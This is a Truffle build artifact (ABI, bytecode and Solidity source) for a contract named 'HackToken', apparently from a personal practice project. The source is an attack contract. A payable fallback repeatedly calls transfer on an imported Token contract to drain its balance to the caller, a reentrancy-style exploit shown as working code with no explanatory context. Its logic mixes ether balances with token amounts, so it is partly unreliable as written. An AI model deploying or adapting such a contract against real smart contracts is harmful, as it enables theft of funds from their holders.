{
  "contractName": "HackToken",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_token",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "token",
      "outputs": [
        {
          "internalType": "contract Token",
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "firstCall",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "myBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516103c93803806103c98339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610335806100946000396000f3fe6080604052600436106100345760003560e01c80631660d0b114610170578063c9116b6914610187578063fc0c546a146101b2575b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631111561016e576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb336000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16316040518363ffffffff1660e01b8152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050600060405180830381600087803b15801561015557600080fd5b505af1158015610169573d6000803e3d6000fd5b505050505b005b34801561017c57600080fd5b50610185610209565b005b34801561019357600080fd5b5061019c6102d3565b6040518082815260200191505060405180910390f35b3480156101be57600080fd5b506101c76102db565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb3067016345785d8a00006040518363ffffffff1660e01b8152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050600060405180830381600087803b1580156102b957600080fd5b505af11580156102cd573d6000803e3d6000fd5b50505050565b600047905090565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff168156fea265627a7a72315820d54549fe68a66e2071f5c1042dce689b5d1c0d6b636930390bea1a694ab893ae64736f6c63430005100032",
  "source": "pragma solidity ^0.5.0;\r\nimport './Token.sol';\r\n\r\ncontract HackToken{\r\n Token public token;\r\n constructor(address _token) public {\r\n    token = Token(_token);\r\n }\r\n function firstCall() public {\r\n    token.transfer(address(this), 0.1 ether);\r\n }\r\n function() external payable {\r\n    if (address(token).balance > 0 ){\r\n        token.transfer(msg.sender, address(token). balance);\r\n    } \r\n }\r\n function myBalance() public view returns(uint) {\r\n    return address(this).balance;\r\n }\r\n}",
  "sourcePath": "C:\\Users\\Fayinminu Olushola\\Desktop\\solidity\\trufflecontracts\\contracts\\HackToken.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.16+commit.9c3226ce.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-09-21T08:52:12.478Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}